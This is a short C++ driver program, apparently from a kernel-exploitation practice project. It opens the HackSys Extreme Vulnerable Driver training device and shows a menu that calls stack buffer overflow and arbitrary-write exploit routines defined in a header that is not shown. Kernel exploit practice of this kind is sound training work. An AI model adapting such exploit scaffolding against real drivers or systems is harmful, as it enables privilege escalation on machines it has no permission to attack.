#include <iostream>
#include "include.h"
#include "exploits.h"

int main()
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "error opening device" << std::endl;
        exit(0);
    }

    std::cout << "0. exit\n select exploit:\n 1. stack BOF\n 2. arbitrary increment\n";
    int answer;
    std::cin >> answer;
    std::cout << "answer: " << answer << '\n';

    switch (answer) {

    case 0:
        exit(0);
        break;
    case 1:
        bufferOverflowStack(hDevice);
        break;

    case 2:
        arbitraryWrite(hDevice);
        break;

    default:{
        std::cout << "bad selection";

    }
    }
    
}

